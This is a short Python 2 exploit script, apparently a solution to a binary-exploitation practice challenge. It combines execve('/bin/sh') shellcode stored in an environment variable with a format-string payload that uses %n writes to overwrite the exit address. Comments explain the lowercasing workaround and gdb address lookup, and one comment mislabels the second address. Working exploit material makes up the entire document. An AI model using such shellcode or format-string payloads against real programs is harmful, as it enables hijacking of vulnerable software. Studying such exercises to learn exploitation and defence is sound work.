shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

exit_addrs  = "\xe0\x97\x04\x08" # 0x80497e0
exit_addrs += "\xe2\x97\x04\x08" # 0x80497e0

# SHELLCODE environment variable contain the shellcode to be executed.
# The reason behine this is because the main function in the executable,
# lower case all the printable characters in the buffer where we write the shellcode.
# So, to overcome this problem we put the shellcode in an environment variable to be
# loaded with the executable from the beginning.

# We can get the SHELLCODE env-var address using the command:
#   p (char *) getenv("SHELLCODE")

# SHELLCODE addre: 0xffffd88f

exit_format = "%55431x%10$n%10096x%11$n"

print exit_addrs + exit_format
